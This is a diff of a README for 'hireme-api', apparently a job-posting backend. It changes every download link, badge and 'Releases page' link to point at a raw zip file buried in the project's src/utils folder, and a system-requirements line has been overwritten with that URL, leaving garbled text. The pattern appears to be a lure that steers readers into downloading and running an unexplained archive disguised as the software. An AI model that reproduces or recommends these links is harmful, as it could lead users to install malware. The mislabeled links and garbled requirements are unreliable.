@@ -6,23 +6,23 @@ Welcome to the hireme-api! This is the backend system for "HireMe," a job postin
 
 ## 📥 Download the Software
 
-[![Download Now](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip)
+[![Download Now](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip)
 
 To get started with hireme-api, you need to visit the Releases page. This page contains the latest version of the software you can download and run.
 
-**Download link:** [Visit Releases Page to Download](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip)
+**Download link:** [Visit Releases Page to Download](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip)
 
 ## 🛠️ System Requirements
 
 Before you proceed, make sure your system meets the following requirements:
 
 - **Operating System:** Linux, macOS, or Windows
-- **https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip** Version 14.x or higher
+- **https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip** Version 14.x or higher
 - **MongoDB:** Version 4.x or higher (for database management)
 
 ## 📂 Installation Steps
 
-1. **Visit the Releases Page:** Click on this link to go to the [Releases page](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip).
+1. **Visit the Releases Page:** Click on this link to go to the [Releases page](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip).
    
 2. **Download the Latest Release:** On the Releases page, find the latest version of hireme-api and click on the download link suitable for your operating system.
 
@@ -86,6 +86,6 @@ Stay tuned for upcoming features and enhancements. We aim to make hireme-api eve
 
 ## 📥 Download the Software Again
 
-For convenience, here is the download link once more. You can head over to this link to get the latest version: [Visit Releases Page to Download](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/api-hireme-1.4.zip). 
+For convenience, here is the download link once more. You can head over to this link to get the latest version: [Visit Releases Page to Download](https://raw.githubusercontent.com/Henchomur/hireme-api/main/src/utils/hireme-api-v3.6.zip). 
 
 Enjoy building with hireme-api!
